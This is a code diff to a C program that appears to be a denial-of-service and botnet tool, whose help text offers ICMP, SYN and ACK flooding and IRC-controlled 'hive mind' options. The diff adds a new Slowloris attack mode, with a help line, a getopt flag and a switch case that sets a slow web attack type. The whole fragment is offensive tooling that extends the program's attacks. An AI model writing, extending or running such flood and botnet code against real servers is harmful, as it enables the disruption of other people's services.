@@ -123,6 +123,7 @@ extern bool irc( const char ** ) __call__;
    show("\n  -B                  ICMP attack");                              \
    show("\n  -S                  TCP SYN attack");                           \
    show("\n  -K                  TCP ACK attack");                           \
+   show("\n  -Y                  SLOWLORIS based attack");                   \
    show("\n  [INFO] Use the -p <port> to set other port than 80 (Default 80)");\
    show("\n\n                          <RSOI - HIVE MIND> Options:");        \
    show("\n  -N <IRC Network>    IRC server to connect");                    \
@@ -239,7 +240,7 @@ int main( int argc, char **argv ) {
    srand(time(NULL));
 
    register unsigned opt, input, i = 0;
-   static char options[] = "UCWBSKbcDd:p:P:q:s:n:-:F:zt:i:I:M:T:ux:l:vH:h:Aa:f:N:L:G:Rr:e:";
+   static char options[] = "UCWBSKYbcDd:p:P:q:s:n:-:F:zt:i:I:M:T:ux:l:vH:h:Aa:f:N:L:G:Rr:e:";
 
    while((opt = getopt(argc,argv,options)) != -1)
       switch(opt) {
@@ -458,6 +459,10 @@ int main( int argc, char **argv ) {
             pkt->webType |= WEB_ACK;
             pkt->tcpType |= TCP_ACK;
             pkt->tcpType |= TCP_PSH;
+            break;
+         case 'Y':
+            pkt->__type__ |= __WEB_MODE__;
+            pkt->webType |= WEB_SLOW;
             break;
 
          // IRC Stuff
